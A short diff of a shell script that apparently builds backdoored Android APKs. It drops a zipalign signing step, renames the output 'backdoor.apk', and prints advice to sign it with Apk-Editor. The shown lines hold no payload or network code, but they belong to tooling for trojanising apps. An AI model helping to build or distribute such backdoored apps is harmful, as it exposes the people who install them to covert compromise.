@@ -48,8 +48,10 @@ cd .. && rm -rf backdoor
 
 #Signing the apk
 echo -e "\e[96m                                 \e[2m"
-echo "[-] Signing the final apk "
-zipalign -v 4 backdoor.apk backdoor-signed.apk
-rm backdoor.apk && mv backdoor-signed.apk $backdoor.apk
 
-#Changing this banner doesn't make you
+mv backdoor.apk $backdoor.apk
+
+echo
+echo -e $Y"I Recommend You To Sign It With Apk-Editor Apk"
+
+#Changing this banner doesn't make you hacker
